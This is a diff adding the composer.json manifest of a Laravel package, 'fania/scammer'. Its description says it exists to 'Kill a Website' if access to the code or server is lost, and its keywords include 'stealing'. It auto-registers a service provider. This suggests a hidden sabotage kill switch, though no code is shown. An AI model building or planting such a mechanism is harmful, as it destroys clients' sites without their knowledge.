@@ -1,0 +1,29 @@
+{
+    "name": "fania/scammer",
+    "type": "package",
+    "description": "a Laravel Package to Kill a Website ! This Package Will Help You to Save Your Life if You Lost Access to The Code or The Server.",
+    "license": "MIT",
+    "version" : 0.1,
+    "keywords": [
+        "framework","laravel","scammer","money","developers","stealing"
+    ],
+    "authors": [
+        {
+            "name": "Abd Alrahman Fani",
+            "email": "faniabdo99@gmail.com"
+        }
+    ],
+    "minimum-stability": "beta",
+    "autoload": {
+      "psr-4": {
+        "fania\\Scammer\\" : "src/"
+      }
+    },
+    "extra" : {
+      "laravel" : {
+        "providers" : [
+          "fania\\Scammer\\ScammerServiceProvider"
+        ]
+      }
+    }
+}
